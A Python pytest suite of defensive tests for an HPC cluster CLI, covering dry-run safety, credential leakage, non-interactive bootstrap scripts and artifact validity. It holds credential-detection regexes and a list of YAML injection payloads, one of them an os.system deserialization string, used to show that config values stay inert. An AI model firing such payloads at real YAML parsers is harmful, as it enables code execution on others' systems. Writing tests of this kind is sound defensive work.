"""Adversarial tests: deliberate attempts to make hpcctl spend money or emit a broken artifact.

The other suites confirm documented behaviour. This one attacks it, along four axes the user
called out plus the safety rails behind them:

1. No credential, account ID, key name, subnet ID, or routable IP may appear in the source, the
   fixtures, the committed ``.env.example``, or anything the CLI writes or prints.
2. Rich rendering must not silently drop characters -- and ``--raw`` must be byte-identical to the
   artifact it came from, while rendered output need not be.
3. The bootstrap script must never be able to block on stdin. An interactive prompt there hangs
   node configuration until the ParallelCluster timeout fires and the node is marked failed.
4. Dry-run artifacts must be syntactically real: the YAML parses and carries every structural
   guarantee, the bash passes ``bash -n``, and every ``#SBATCH`` directive precedes the first
   command (Slurm silently ignores late directives, so this is asserted positionally).

Underneath all four sits the rail that matters most: no dry-run path may execute anything.
:class:`TestNothingExecutes` monkeypatches :func:`subprocess.run` to raise and drives every
command through every dry-run route.

Three regression classes at the end pin bugs this pass found: an unvalidated ``--job-name`` that
escaped the run directory, injected into a remote shell command, and corrupted the ``#SBATCH``
block; and an unquoted ``rsync -e`` transport that split an SSH key path on its spaces.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
from pathlib import Path
from typing import Any

import pytest
import yaml
from conftest import blank_env, valid_dag_document
from typer.testing import CliRunner

from hpcctl.cli import app
from hpcctl.commands.deploy import _rsync_argv
from hpcctl.commands.submit import JOB_NAME_PATTERN
from hpcctl.config import Settings, load_settings
from hpcctl.console import RAW_DELIMITER
from hpcctl.exit_codes import ExitCode
from hpcctl.generators.bootstrap import bootstrap_path, bootstrap_text
from hpcctl.generators.cluster_config import render_cluster_config
from hpcctl.generators.sbatch import remote_dag_path, render_sbatch, sbatch_directives

SRC = Path(__file__).resolve().parents[1] / "src"
ENV_EXAMPLE = Path(__file__).resolve().parents[1] / ".env.example"
BOOTSTRAP = SRC / "hpcctl" / "bootstrap" / "install_engine_deps.sh"

LIVE_ENV: dict[str, str] = {
    "AWS_REGION": "us-east-1",
    "HPCCTL_KEY_NAME": "example-keypair",
    "HPCCTL_HEAD_SUBNET_ID": "subnet-00000000000000000",
    "HPCCTL_BOOTSTRAP_BUCKET": "example-bucket",
    "HPCCTL_HEAD_NODE_HOST": "203.0.113.10",
}
"""A fully-specified environment, so a command reaches its execution path rather than exiting 3."""


def _python_sources() -> list[Path]:
    """Collect every shipped Python module.

    Returns:
        Paths of all ``.py`` files under ``src/``.
    """
    return sorted(SRC.rglob("*.py"))


def _raw_artifacts(stdout: str) -> dict[str, str]:
    """Split ``--raw`` output back into its constituent artifacts.

    Args:
        stdout: Captured ``--raw`` standard output.

    Returns:
        A mapping of artifact name to exact body text.
    """
    marker = re.compile(re.escape(RAW_DELIMITER).replace(r"\{name\}", r"(?P<name>[\w-]+)"))
    artifacts: dict[str, list[str]] = {}
    current: str | None = None
    for line in stdout.splitlines(keepends=True):
        matched = marker.match(line.rstrip("\n"))
        if matched:
            current = matched.group("name")
            artifacts[current] = []
        elif current is not None:
            artifacts[current].append(line)
    return {name: "".join(body) for name, body in artifacts.items()}


class TestNoHardcodedCredentials:
    """Mandate 1. Nothing secret, and nothing real, may be baked in anywhere."""

    @pytest.mark.parametrize(
        "pattern",
        [
            r"AKIA[0-9A-Z]{16}",
            r"ASIA[0-9A-Z]{16}",
            r"aws_secret_access_key",
            r"aws_access_key_id",
            r"-----BEGIN [A-Z ]*PRIVATE KEY-----",
            r"\barn:aws:",
            r"\b\d{12}\b",
        ],
    )
    def test_no_credential_pattern_in_shipped_source(self, pattern: str) -> None:
        """Account IDs are twelve digits, which is why that bare-number pattern is here."""
        compiled = re.compile(pattern)
        for path in [*_python_sources(), BOOTSTRAP]:
            text = path.read_text(encoding="utf-8")
            assert not compiled.search(text), f"{pattern} matched in {path}"

    @pytest.mark.parametrize(
        "pattern",
        [r"AKIA[0-9A-Z]{16}", r"-----BEGIN", r"\barn:aws:", r"\b\d{12}\b"],
    )
    def test_no_credential_pattern_in_env_example(self, pattern: str) -> None:
        assert not re.search(pattern, ENV_EXAMPLE.read_text(encoding="utf-8"))

    def test_env_example_holds_no_routable_ip(self) -> None:
        """Only RFC 5737 documentation ranges, so a copied template cannot dial a stranger."""
        found = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", ENV_EXAMPLE.read_text(encoding="utf-8"))
        documentation = ("192.0.2.", "198.51.100.", "203.0.113.")
        for address in found:
            assert address.startswith(documentation), f"{address} is not a documentation address"

    def test_env_example_subnet_ids_are_obviously_fake(self) -> None:
        for subnet in re.findall(r"subnet-\w+", ENV_EXAMPLE.read_text(encoding="utf-8")):
            assert set(subnet.removeprefix("subnet-")) <= {"0"}, subnet

    def test_no_module_reads_the_environment_except_config(self) -> None:
        """One module owns env access, so the resolved config is a single testable value."""
        for path in _python_sources():
            if path.name == "config.py":
                continue
            assert "os.environ" not in path.read_text(encoding="utf-8"), path

    def test_generated_artifacts_carry_no_secrets(self, runner: CliRunner, tmp_path: Path) -> None:
        result = runner.invoke(
            app, ["boot", "--raw"], env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run"), **LIVE_ENV)
        )
        assert result.exit_code == ExitCode.OK
        for pattern in (r"AKIA", r"-----BEGIN", r"\barn:aws:", r"\b\d{12}\b"):
            assert not re.search(pattern, result.stdout)

    def test_ssh_key_contents_are_never_printed(self, runner: CliRunner, tmp_path: Path) -> None:
        """Only the key's path may appear; its bytes must not."""
        key = tmp_path / "id_rsa"
        key.write_text("-----BEGIN PRIVATE KEY-----\nADVERSARIALSECRET\n", encoding="utf-8")
        build = tmp_path / "build"
        build.mkdir()
        (build / "engine").write_bytes(b"\x7fELF")
        result = runner.invoke(
            app,
            ["deploy", "--build-dir", str(build)],
            env=blank_env(HPCCTL_SSH_KEY_PATH=str(key), **LIVE_ENV),
        )
        assert result.exit_code == ExitCode.OK
        assert "ADVERSARIALSECRET" not in result.stdout
        assert "BEGIN PRIVATE KEY" not in result.stdout


class TestNothingExecutes:
    """The central safety rail: no dry-run path may run an external command."""

    @pytest.fixture
    def no_subprocess(self, monkeypatch: pytest.MonkeyPatch) -> list[Any]:
        """Make any :func:`subprocess.run` call a hard test failure.

        Args:
            monkeypatch: pytest's attribute patcher.

        Returns:
            A list that stays empty; a populated list means something executed.
        """
        calls: list[Any] = []

        def explode(*args: Any, **kwargs: Any) -> None:
            calls.append(args[0] if args else kwargs.get("args"))
            raise AssertionError(f"subprocess fired in a dry-run path: {calls[-1]!r}")

        monkeypatch.setattr(subprocess, "run", explode)
        return calls

    def _argv_cases(self, dag: Path, build: Path) -> list[tuple[str, list[str]]]:
        """Enumerate every dry-run route through every AWS-touching command.

        Args:
            dag: A valid DAG file.
            build: A non-empty engine build directory.

        Returns:
            ``(label, argv)`` pairs to drive through the runner.
        """
        return [
            ("boot default", ["boot"]),
            ("boot explicit", ["boot", "--dry-run"]),
            ("boot raw", ["boot", "--raw"]),
            ("deploy default", ["deploy", "--build-dir", str(build)]),
            ("submit default", ["submit", "--dag", str(dag)]),
            ("submit raw", ["submit", "--dag", str(dag), "--raw"]),
            ("submit validate-only", ["submit", "--dag", str(dag), "--validate-only"]),
            ("status default", ["status"]),
            ("status no-queue", ["status", "--no-queue"]),
            ("destroy default", ["destroy"]),
            ("destroy yes", ["destroy", "--yes"]),
        ]

    def test_no_command_executes_in_dry_run(
        self,
        runner: CliRunner,
        valid_dag: Path,
        build_dir: Path,
        tmp_path: Path,
        no_subprocess: list[Any],
    ) -> None:
        env = blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run"))
        for label, argv in self._argv_cases(valid_dag, build_dir):
            result = runner.invoke(app, argv, env=env)
            assert result.exit_code == ExitCode.OK, f"{label} exited {result.exit_code}"
        assert no_subprocess == []

    def test_no_command_executes_in_dry_run_with_a_full_environment(
        self,
        runner: CliRunner,
        valid_dag: Path,
        build_dir: Path,
        tmp_path: Path,
        no_subprocess: list[Any],
    ) -> None:
        """A complete config must not tip a dry-run into doing something real."""
        env = blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run"), **LIVE_ENV)
        for label, argv in self._argv_cases(valid_dag, build_dir):
            result = runner.invoke(app, argv, env=env)
            assert result.exit_code == ExitCode.OK, f"{label} exited {result.exit_code}"
        assert no_subprocess == []

    @pytest.mark.parametrize(
        "argv",
        [
            ["boot", "--execute"],
            ["deploy", "--execute"],
            ["submit", "--execute"],
            ["status", "--execute"],
            ["destroy", "--execute", "--yes"],
        ],
    )
    def test_kill_switch_defeats_execute(
        self,
        runner: CliRunner,
        valid_dag: Path,
        build_dir: Path,
        tmp_path: Path,
        no_subprocess: list[Any],
        argv: list[str],
    ) -> None:
        """``HPCCTL_DRY_RUN`` outranks ``--execute``; a flag must not be able to override it."""
        full = list(argv)
        if full[0] == "submit":
            full += ["--dag", str(valid_dag)]
        if full[0] == "deploy":
            full += ["--build-dir", str(build_dir)]
        result = runner.invoke(
            app,
            full,
            env=blank_env(HPCCTL_DRY_RUN="1", HPCCTL_RUN_DIR=str(tmp_path / "run"), **LIVE_ENV),
        )
        assert result.exit_code == ExitCode.OK
        assert no_subprocess == []

    @pytest.mark.parametrize("value", ["1", "true", "no", "0", "false", " "])
    def test_any_non_empty_kill_switch_value_forces_dry_run(
        self, runner: CliRunner, tmp_path: Path, no_subprocess: list[Any], value: str
    ) -> None:
        """Even ``0`` and ``false`` count: the switch tests non-emptiness, deliberately."""
        result = runner.invoke(
            app,
            ["boot", "--execute"],
            env=blank_env(HPCCTL_DRY_RUN=value, HPCCTL_RUN_DIR=str(tmp_path / "run"), **LIVE_ENV),
        )
        assert result.exit_code == ExitCode.OK
        assert no_subprocess == []

    def test_empty_kill_switch_does_not_force_dry_run(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        """An empty value is unset; the run proceeds to the tool check and exits 5, not 0."""
        result = runner.invoke(
            app,
            ["boot", "--execute"],
            env=blank_env(HPCCTL_DRY_RUN="", HPCCTL_RUN_DIR=str(tmp_path / "run"), **LIVE_ENV),
        )
        assert result.exit_code == ExitCode.TOOL_MISSING


class TestDestroyRails:
    """The one irreversible command, and the three rules that gate it."""

    def test_dry_run_never_prompts_even_with_empty_stdin(self, runner: CliRunner) -> None:
        """Prompting here would train the confirmation reflex this UX exists to prevent."""
        result = runner.invoke(app, ["destroy"], env=blank_env(**LIVE_ENV), input="")
        assert result.exit_code == ExitCode.OK
        assert "Type the cluster name" not in result.stdout

    def test_non_tty_stdin_without_yes_aborts_rather_than_blocking(self, runner: CliRunner) -> None:
        result = runner.invoke(app, ["destroy", "--execute"], env=blank_env(**LIVE_ENV), input="")
        assert result.exit_code == ExitCode.ABORTED

    def test_wrong_cluster_name_aborts(
        self, runner: CliRunner, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr("sys.stdin.isatty", lambda: True)
        result = runner.invoke(
            app, ["destroy", "--execute"], env=blank_env(**LIVE_ENV), input="not-the-name\n"
        )
        assert result.exit_code == ExitCode.ABORTED

    def test_a_near_miss_still_aborts(
        self, runner: CliRunner, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """One character off is still off."""
        monkeypatch.setattr("sys.stdin.isatty", lambda: True)
        result = runner.invoke(
            app,
            ["destroy", "--execute"],
            env=blank_env(HPCCTL_CLUSTER_NAME="prod-cluster", **LIVE_ENV),
            input="prod-cluste\n",
        )
        assert result.exit_code == ExitCode.ABORTED

    def test_empty_confirmation_aborts(
        self, runner: CliRunner, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr("sys.stdin.isatty", lambda: True)
        result = runner.invoke(app, ["destroy", "--execute"], env=blank_env(**LIVE_ENV), input="\n")
        assert result.exit_code == ExitCode.ABORTED


class TestBootstrapNonInteractivity:
    """Mandate 3. A prompt on a cluster node hangs boot until the timeout marks it failed."""

    @pytest.fixture
    def script(self) -> str:
        """Read the packaged bootstrap script.

        Returns:
            The exact script text.
        """
        return bootstrap_text()

    def test_passes_bash_syntax_check(self) -> None:
        completed = subprocess.run(
            ["bash", "-n", str(BOOTSTRAP)], capture_output=True, text=True, check=False
        )
        assert completed.returncode == 0, completed.stderr

    def test_shellcheck_is_clean_when_available(self) -> None:
        """Optional by design: shellcheck is not installed on the dev VM, so absence skips."""
        import shutil

        binary = shutil.which("shellcheck")
        if binary is None:
            pytest.skip("shellcheck not installed")
        completed = subprocess.run(
            [binary, "--severity=warning", str(BOOTSTRAP)],
            capture_output=True,
            text=True,
            check=False,
        )
        assert completed.returncode == 0, completed.stdout

    @pytest.mark.parametrize(
        "required",
        [
            "set -euo pipefail",
            "export DEBIAN_FRONTEND=noninteractive",
            "export NEEDRESTART_MODE=a",
            "export NEEDRESTART_SUSPEND=1",
            "--force-confdef",
            "--force-confold",
        ],
    )
    def test_required_non_interactive_settings_are_present(
        self, script: str, required: str
    ) -> None:
        assert required in script

    def test_shebang_is_env_bash(self, script: str) -> None:
        assert script.startswith("#!/usr/bin/env bash\n")

    def test_no_bare_apt_subcommand(self, script: str) -> None:
        """``apt`` is a human-facing wrapper whose behaviour changes between releases."""
        assert not re.search(r"(^|[^-\w])apt\s+(install|update|upgrade|remove)", script, re.M)

    def test_never_upgrades(self, script: str) -> None:
        """Unbounded runtime and unrelated changes between you and a running job."""
        assert not re.search(r"apt-get\s+(dist-)?upgrade", script)

    def test_every_apt_get_install_is_non_interactive(self, script: str) -> None:
        """Each install must inherit ``-y`` and both dpkg force options via ``APT_OPTS``."""
        installs = re.findall(r"^\s*\$SUDO apt-get install .*$", script, re.M)
        assert installs
        for line in installs:
            assert '"${APT_OPTS[@]}"' in line, line

    def test_apt_opts_carries_yes_and_both_dpkg_options(self, script: str) -> None:
        block = script.split("APT_OPTS=(", 1)[1].split(")", 1)[0]
        assert re.search(r"^\s*-y\s*$", block, re.M)
        assert "--force-confdef" in block
        assert "--force-confold" in block

    @pytest.mark.parametrize(
        "blocking",
        ["read", "select", "pause", "dialog", "whiptail", "nano", "vim", "less", "more", "passwd"],
    )
    def test_no_command_that_can_block_on_stdin(self, script: str, blocking: str) -> None:
        """Scans every branch, not just the happy path."""
        assert not re.search(rf"(^|[^\w./-]){blocking}(\s|$)", script, re.M)

    def test_no_interactive_apt_frontend_is_selected(self, script: str) -> None:
        for frontend in ("dialog", "readline", "gtk", "editor"):
            assert f"DEBIAN_FRONTEND={frontend}" not in script

    def test_debian_frontend_is_exported_before_any_apt_call(self, script: str) -> None:
        """Setting it after the first transaction would be too late to suppress debconf."""
        export_at = script.index("export DEBIAN_FRONTEND=noninteractive")
        calls = ("apt-get update", "apt-get install")
        first_apt = min(
            (script.index(token) for token in calls if token in script), default=len(script)
        )
        assert export_at < first_apt

    def test_is_idempotent_via_a_version_stamped_marker(self, script: str) -> None:
        assert 'BOOTSTRAP_VERSION="1"' in script
        assert "bootstrap.v${BOOTSTRAP_VERSION}.done" in script
        assert "already provisioned" in script

    def test_apt_update_retries_rather_than_killing_the_node(self, script: str) -> None:
        """One transient mirror failure under ``set -e`` would otherwise fail the whole node."""
        assert "apt_update_with_retry" in script
        assert re.search(r"for attempt in 1 2 3 4 5", script)

    def test_verifies_the_toolchain_before_declaring_success(self, script: str) -> None:
        for tool in ("gcc", "cmake", "ninja", "mpicc", "protoc"):
            assert tool in script
        assert "missing after install" in script

    def test_help_exits_without_running_anything(self) -> None:
        """``--help`` must not touch apt, so it is safe to probe on any machine."""
        completed = subprocess.run(
            ["bash", str(BOOTSTRAP), "--help"], capture_output=True, text=True, check=False
        )
        assert completed.returncode == 0
        assert "Usage:" in completed.stdout

    def test_unknown_argument_fails_fast_without_prompting(self) -> None:
        completed = subprocess.run(
            ["bash", str(BOOTSTRAP), "--nonsense"],
            capture_output=True,
            text=True,
            check=False,
            stdin=subprocess.DEVNULL,
            timeout=15,
        )
        assert completed.returncode != 0
        assert "unknown argument" in completed.stderr

    def test_runs_to_completion_with_closed_stdin(self) -> None:
        """The decisive check: with no stdin at all it must not hang, it must finish or fail."""
        completed = subprocess.run(
            ["bash", str(BOOTSTRAP), "--help"],
            capture_output=True,
            text=True,
            check=False,
            stdin=subprocess.DEVNULL,
            timeout=15,
        )
        assert completed.returncode == 0

    def test_packaged_script_is_locatable_and_matches_the_repository_copy(self) -> None:
        assert bootstrap_path().is_file()
        assert bootstrap_text() == BOOTSTRAP.read_text(encoding="utf-8")


class TestRenderingFidelity:
    """Mandate 2. Rich may reflow, but it may never drop characters."""

    @pytest.fixture
    def long_line_body(self) -> str:
        """Build a bash artifact with a line far wider than any terminal.

        Returns:
            A short script whose middle line is over 300 characters.
        """
        packages = " ".join(f"package-number-{index:02d}" for index in range(20))
        return f"#!/bin/bash\nsudo apt-get install -y {packages}\necho done\n"

    def test_panel_wrapping_would_truncate(self, long_line_body: str) -> None:
        """The trap §9 measured, pinned so nobody reintroduces a Panel around an artifact."""
        import io

        from rich.console import Console
        from rich.panel import Panel
        from rich.syntax import Syntax

        target = "".join(long_line_body.splitlines()[1].split())
        buffer = io.StringIO()
        Console(file=buffer, width=80).print(Panel(Syntax(long_line_body, "bash", word_wrap=True)))
        assert target not in "".join(buffer.getvalue().split())

    def test_render_artifact_preserves_every_character(self, long_line_body: str) -> None:
        import io

        from rich.console import Console

        from hpcctl import console as console_module

        target = "".join(long_line_body.splitlines()[1].split())
        buffer = io.StringIO()
        console_module._stdout = Console(file=buffer, width=80)
        try:
            console_module.render_artifact("bootstrap (bash)", long_line_body, "bash")
        finally:
            console_module.configure(no_color=True)
        assert target in "".join(buffer.getvalue().split())

    def test_raw_bootstrap_is_byte_identical_to_the_packaged_script(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        result = runner.invoke(
            app, ["boot", "--raw"], env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run"))
        )
        assert result.exit_code == ExitCode.OK
        assert _raw_artifacts(result.stdout)["bootstrap"] == bootstrap_text()

    def test_raw_cluster_config_is_byte_identical_to_the_generator(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        result = runner.invoke(
            app, ["boot", "--raw"], env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run"))
        )
        emitted = _raw_artifacts(result.stdout)["cluster-config"]
        written = (tmp_path / "run" / "hpc-dag-baseline-config.yaml").read_text(encoding="utf-8")
        assert emitted == written

    def test_rendered_output_is_not_byte_identical(
        self, runner: CliRunner, tmp_path: Path, wide_console: None
    ) -> None:
        """The negative case that justifies keeping ``--raw`` around."""
        result = runner.invoke(app, ["boot"], env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run")))
        assert result.exit_code == ExitCode.OK
        assert bootstrap_text() not in result.stdout

    def test_raw_output_carries_no_ansi_escapes(self, runner: CliRunner, tmp_path: Path) -> None:
        result = runner.invoke(
            app, ["boot", "--raw"], env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run"))
        )
        assert "\x1b[" not in result.stdout

    def test_raw_bootstrap_still_passes_bash_syntax_check(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        result = runner.invoke(
            app, ["boot", "--raw"], env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run"))
        )
        script = tmp_path / "roundtrip.sh"
        script.write_text(_raw_artifacts(result.stdout)["bootstrap"], encoding="utf-8")
        assert subprocess.run(["bash", "-n", str(script)], check=False).returncode == 0

    def test_raw_sbatch_is_byte_identical_to_the_written_artifact(
        self, runner: CliRunner, valid_dag: Path, tmp_path: Path
    ) -> None:
        run_dir = tmp_path / "run"
        result = runner.invoke(
            app,
            ["submit", "--dag", str(valid_dag), "--raw"],
            env=blank_env(HPCCTL_RUN_DIR=str(run_dir)),
        )
        assert result.exit_code == ExitCode.OK
        written = (run_dir / "bench-matmul-001.sbatch.generated").read_text(encoding="utf-8")
        assert _raw_artifacts(result.stdout)["sbatch"] == written


class TestDryRunArtifactsAreReal:
    """Mandate 4. Generated artifacts must parse, not merely look right."""

    def test_cluster_config_parses_as_a_single_yaml_document(self, settings: Settings) -> None:
        text = render_cluster_config(settings, bootstrap_url="s3://bucket/key.sh")
        assert len(list(yaml.safe_load_all(text))) == 1

    def test_nine_structural_assertions(self, settings: Settings) -> None:
        """Every guarantee §8 calls load-bearing, checked on one parsed document."""
        url = "s3://bucket/hpcctl/bootstrap/install_engine_deps-1a2b3c4d.sh"
        document = yaml.safe_load(render_cluster_config(settings, bootstrap_url=url))
        queue = document["Scheduling"]["SlurmQueues"][0]

        assert document["Region"] == settings.region
        assert document["Image"]["Os"] == settings.os_image
        assert document["HeadNode"]["Ssh"]["KeyName"] == settings.key_name
        assert document["Scheduling"]["Scheduler"] == "slurm"
        assert document["HeadNode"]["CustomActions"]["OnNodeConfigured"]["Script"] == url
        assert queue["CustomActions"]["OnNodeConfigured"]["Script"] == url
        assert document["HeadNode"]["Iam"]["S3Access"][0]["EnableWriteAccess"] is False
        assert queue["Iam"]["S3Access"][0]["EnableWriteAccess"] is False
        assert document["SharedStorage"][0]["MountDir"] == settings.shared_dir

    def test_a_config_full_of_placeholders_still_parses(self, settings: Settings) -> None:
        """``<<<UNSET:NAME>>>`` is a legal YAML scalar, which is the point of the format."""
        document = yaml.safe_load(render_cluster_config(settings, bootstrap_url=None))
        assert document["HeadNode"]["Ssh"]["KeyName"].startswith("<<<UNSET:")

    def test_omitting_the_bootstrap_url_drops_the_hook_and_the_grant(
        self, settings: Settings
    ) -> None:
        document = yaml.safe_load(render_cluster_config(settings, bootstrap_url=None))
        assert "CustomActions" not in document["HeadNode"]
        assert "Iam" not in document["HeadNode"]
        assert "CustomActions" not in document["Scheduling"]["SlurmQueues"][0]

    @pytest.mark.parametrize(
        "payload",
        [
            "evil\n---\nRegion: pwned",
            "a: b",
            "name # comment",
            "&anchor evil",
            "*alias",
            "!!python/object/apply:os.system ['id']",
            "{a: 1}",
            "- item",
            "key: value",
            "yes",
            "null",
            "a\tb",
            'he said "hi"',
            "clüster-🚀",
        ],
    )
    def test_env_values_cannot_break_the_yaml_structure(
        self, monkeypatch: pytest.MonkeyPatch, payload: str
    ) -> None:
        """A hostile cluster name must stay one scalar, not become a second document."""
        monkeypatch.setenv("HPCCTL_CLUSTER_NAME", payload)
        monkeypatch.setenv("HPCCTL_QUEUE_NAME", payload)
        text = render_cluster_config(load_settings(live=False), bootstrap_url="s3://b/k.sh")
        documents = list(yaml.safe_load_all(text))
        assert len(documents) == 1
        assert set(documents[0]) == {
            "Region",
            "Image",
            "HeadNode",
            "Scheduling",
            "SharedStorage",
        }
        assert documents[0]["Scheduling"]["SlurmQueues"][0]["Name"] == payload

    def test_sbatch_directives_all_precede_the_first_command(self, settings: Settings) -> None:
        """Positional, because Slurm silently ignores a directive placed after a command."""
        text = render_sbatch(settings, dag_remote_path="/shared/dags/x.json", job_name="job")
        lines = text.splitlines()
        first_command = next(
            index for index, line in enumerate(lines) if line.strip() and not line.startswith("#")
        )
        directives = [index for index, line in enumerate(lines) if line.startswith("#SBATCH ")]
        assert directives
        assert all(index < first_command for index in directives)

    def test_sbatch_directives_are_contiguous(self, settings: Settings) -> None:
        text = render_sbatch(settings, dag_remote_path="/shared/dags/x.json", job_name="job")
        lines = text.splitlines()
        directives = [index for index, line in enumerate(lines) if line.startswith("#SBATCH ")]
        assert directives == list(range(directives[0], directives[-1] + 1))

    def test_no_sbatch_directive_hides_after_the_first_command(self, settings: Settings) -> None:
        """The specific silent failure: a directive Slurm will never read."""
        text = render_sbatch(settings, dag_remote_path="/shared/dags/x.json", job_name="job")
        _, _, tail = text.partition("set -euo pipefail")
        assert "#SBATCH" not in tail

    def test_sbatch_passes_bash_syntax_check(self, settings: Settings, tmp_path: Path) -> None:
        script = tmp_path / "job.sbatch"
        script.write_text(
            render_sbatch(settings, dag_remote_path="/shared/dags/x.json", job_name="job"),
            encoding="utf-8",
        )
        assert subprocess.run(["bash", "-n", str(script)], check=False).returncode == 0

    def test_every_directive_carries_the_marker(self, settings: Settings) -> None:
        for directive in sbatch_directives(settings, job_name="job"):
            assert directive.startswith("#SBATCH --")

    def test_sbatch_from_a_fully_unset_environment_still_parses(
        self, settings: Settings, tmp_path: Path
    ) -> None:
        """No placeholder may reach the sbatch body, because the format is bash-hostile.

        ``<<<UNSET:NAME>>>`` was designed to be a legal YAML scalar, and it is -- but ``<<<`` is
        bash's here-string operator, so the same string inside a shell script makes ``bash -n``
        fail. Every value the batch script interpolates has a default and can never be a
        placeholder; this pins that, so routing a placeholder-able variable in here fails loudly.
        """
        script = tmp_path / "unset.sbatch"
        body = render_sbatch(
            settings, dag_remote_path=remote_dag_path(settings, "d.json"), job_name="job"
        )
        assert "<<<UNSET" not in body
        script.write_text(body, encoding="utf-8")
        assert subprocess.run(["bash", "-n", str(script)], check=False).returncode == 0

    def test_printed_commands_stay_paste_safe_when_full_of_placeholders(
        self, settings: Settings
    ) -> None:
        """A dry-run command line must survive a copy-paste even when nothing is configured.

        Placeholders carry ``<``, ``>``, and ``:``, so an unquoted render would turn into a
        redirection the moment a user pasted it. ``shlex.join`` is what prevents that; the check
        is that the rendered line lexes back to exactly the argv it came from.
        """
        import shlex

        from hpcctl.external import ssh_argv
        from hpcctl.generators.bootstrap import upload_argv

        candidates = [
            upload_argv(settings),
            ssh_argv(
                key_path=settings.ssh_key_path,
                user=settings.ssh_user,
                host=settings.head_node_host,
                remote_command="sbatch /shared/dags/j.sbatch.generated",
            ),
        ]
        for argv in candidates:
            assert shlex.split(shlex.join(argv)) == list(argv)


class TestSubmitValidation:
    """``submit`` must reject a bad DAG cleanly, with no traceback and the right code."""

    def test_missing_file_is_a_usage_error_from_typer(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        result = runner.invoke(
            app, ["submit", "--dag", str(tmp_path / "absent.json")], env=blank_env()
        )
        assert result.exit_code == ExitCode.USAGE

    def test_malformed_json_exits_four_without_a_traceback(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        bad = tmp_path / "bad.json"
        bad.write_text("{not json", encoding="utf-8")
        result = runner.invoke(app, ["submit", "--dag", str(bad)], env=blank_env())
        assert result.exit_code == ExitCode.DAG_INVALID
        assert "Traceback" not in result.stdout

    def test_json_error_names_the_line_and_column(self, runner: CliRunner, tmp_path: Path) -> None:
        bad = tmp_path / "bad.json"
        bad.write_text('{\n  "metadata": ,\n}', encoding="utf-8")
        result = runner.invoke(app, ["submit", "--dag", str(bad)], env=blank_env())
        assert result.exit_code == ExitCode.DAG_INVALID
        assert "line" in result.output and "column" in result.output

    def test_valid_json_failing_the_schema_exits_four(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        document = valid_dag_document()
        document["nodes"][0]["op"] = "transpose"
        path = tmp_path / "badop.json"
        path.write_text(json.dumps(document), encoding="utf-8")
        result = runner.invoke(app, ["submit", "--dag", str(path)], env=blank_env())
        assert result.exit_code == ExitCode.DAG_INVALID
        assert "Traceback" not in result.stdout

    def test_multiple_schema_errors_are_all_reported(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        document = valid_dag_document()
        document["nodes"][0]["op"] = "transpose"
        document["nodes"][1]["dtype"] = "int8"
        del document["metadata"]["ordering"]
        path = tmp_path / "many.json"
        path.write_text(json.dumps(document), encoding="utf-8")
        result = runner.invoke(app, ["submit", "--dag", str(path)], env=blank_env())
        assert result.exit_code == ExitCode.DAG_INVALID
        assert re.search(r"\d+ problem", result.output)

    def test_json_array_at_the_top_level_is_rejected(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        path = tmp_path / "array.json"
        path.write_text("[]", encoding="utf-8")
        result = runner.invoke(app, ["submit", "--dag", str(path)], env=blank_env())
        assert result.exit_code == ExitCode.DAG_INVALID

    def test_empty_file_is_rejected(self, runner: CliRunner, tmp_path: Path) -> None:
        path = tmp_path / "empty.json"
        path.write_text("", encoding="utf-8")
        result = runner.invoke(app, ["submit", "--dag", str(path)], env=blank_env())
        assert result.exit_code == ExitCode.DAG_INVALID

    def test_the_rank_zero_case_new_in_1_1_0_validates(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        """A vector-vector dot serializes ``output_shape: []`` and must be accepted."""
        document: dict[str, Any] = {
            "metadata": {
                "schema_version": "1.1.0",
                "dag_id": "rank-zero",
                "ordering": "topological",
            },
            "nodes": [
                {
                    "id": "u",
                    "op": "init",
                    "output_shape": [3],
                    "dtype": "float64",
                    "seed": 1,
                    "shape": [3],
                    "distribution": "ones",
                },
                {
                    "id": "v",
                    "op": "init",
                    "output_shape": [3],
                    "dtype": "float64",
                    "seed": 2,
                    "shape": [3],
                    "distribution": "ones",
                },
                {
                    "id": "s",
                    "op": "dot_product",
                    "output_shape": [],
                    "dtype": "float64",
                    "inputs": ["u", "v"],
                },
            ],
            "outputs": ["s"],
        }
        path = tmp_path / "rank0.json"
        path.write_text(json.dumps(document), encoding="utf-8")
        result = runner.invoke(
            app, ["submit", "--dag", str(path), "--validate-only"], env=blank_env()
        )
        assert result.exit_code == ExitCode.OK

    def test_a_large_dag_validates_without_incident(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        nodes: list[dict[str, Any]] = [
            {
                "id": "init_0",
                "op": "init",
                "output_shape": [4, 4],
                "dtype": "float64",
                "seed": 1,
                "shape": [4, 4],
                "distribution": "ones",
            }
        ]
        for index in range(1, 2000):
            nodes.append(
                {
                    "id": f"scale_{index}",
                    "op": "scale",
                    "output_shape": [4, 4],
                    "dtype": "float64",
                    "inputs": [nodes[-1]["id"]],
                    "factor": 1.5,
                }
            )
        document = {
            "metadata": {
                "schema_version": "1.1.0",
                "dag_id": "huge",
                "ordering": "topological",
            },
            "nodes": nodes,
            "outputs": [nodes[-1]["id"]],
        }
        path = tmp_path / "huge.json"
        path.write_text(json.dumps(document), encoding="utf-8")
        result = runner.invoke(
            app, ["submit", "--dag", str(path), "--validate-only"], env=blank_env()
        )
        assert result.exit_code == ExitCode.OK

